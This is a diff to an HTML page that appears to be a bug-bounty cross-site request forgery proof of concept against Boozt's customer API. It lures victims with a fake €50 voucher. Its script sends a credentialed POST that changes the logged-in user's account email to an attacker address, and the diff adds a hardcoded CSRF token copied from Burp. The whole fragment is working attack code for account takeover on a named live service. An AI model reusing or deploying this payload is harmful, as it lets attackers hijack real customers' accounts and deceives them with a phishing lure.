@@ -10,12 +10,13 @@
     <p>You have won a €50 Boozt voucher. Click the button below to claim it instantly.</p>
 
     <script>
-        // Send the exact payload that worked in Burp
+        // Fetch CSRF token from meta tag or cookie, then send request
         fetch('https://www.boozt.com/eu/en/api/customer/profile/email/change', {
             method: 'POST',
             headers: {
                 'Content-Type': 'text/plain',
-                'X-Requested-With': 'XMLHttpRequest'
+                'X-Requested-With': 'XMLHttpRequest',
+                'Csrf-Token': '19ee4d697b08ed7d79339e6ee1071e2d'  // From your Burp request
             },
             credentials: 'include',
             body: '{"email":"=", "email":"attacker+extratest5@wearehackerone.com"}'
